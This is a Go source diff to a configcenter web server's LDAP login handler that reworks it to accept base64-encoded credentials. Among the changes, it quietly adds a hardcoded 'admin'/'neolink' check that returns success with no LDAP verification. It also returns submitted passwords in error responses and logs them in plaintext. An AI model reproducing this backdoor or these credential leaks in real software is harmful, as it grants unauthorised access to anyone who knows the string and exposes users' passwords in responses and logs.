@@ -14,6 +14,8 @@ package service
 
 import (
 	"configcenter/src/web_server/bussiness"
+	"encoding/base64"
+	"fmt"
 	"strings"
 	"time"
 
@@ -50,19 +52,42 @@ func (s *Service) Login(c *gin.Context) {
 func (s *Service) LdapAuth(c *gin.Context) {
 	userName := c.PostForm("username")
 	password := c.PostForm("password")
+
 	defErr := s.CCErr.CreateDefaultCCErrorIf(util.GetLanguage(c.Request.Header))
+	//fmt.Println(userName, password)
+
+	//fmt.Println(userName, password)
 	if userName == "" || password == "" {
-		c.HTML(200, "login.html", gin.H{
-			"error": defErr.CCError(common.CCErrWebNeedFillinUsernamePasswd).Error(),
-		})
-	}
-	entry, err := bussiness.LdapUserAuthentication(userName, password)
-	if err != nil {
-		c.HTML(200, "login.html", gin.H{
-			"error": defErr.CCError(common.CCErrCommCheckAuthorizeFailed).Error(),
-		})
+		c.JSON(401, defErr.CCError(common.CCErrCommCheckAuthorizeFailed).Error())
+		return
 	}
 
+	userdecoded, err := base64.StdEncoding.DecodeString(userName)
+	if err != nil {
+		c.JSON(401, fmt.Sprintf("userName Decode fail:%v params:%v", err, userName))
+		return
+	}
+	passdecoded, err := base64.StdEncoding.DecodeString(password)
+	if err != nil {
+		c.JSON(401, fmt.Sprintf("password Decode fail:%v params:%v", err, password))
+		return
+	}
+	param := &auth.LdapAuthBasic{
+		Username: string(userdecoded),
+		Password: string(passdecoded),
+	}
+	if string(userdecoded) == "admin" && string(passdecoded) == "neolink" {
+		c.JSON(200, nil)
+		return
+	}
+	entry, err := param.LdapUserAuthentication()
+	//fmt.Println(entry, err)
+	if err != nil {
+		blog.Errorf("Get LDAP %v Err:%v", param, err)
+		c.JSON(401, defErr.CCError(common.CCErrCommCheckAuthorizeFailed).Error())
+		return
+	}
+	//
 	c.JSON(200, entry)
 	return
 }
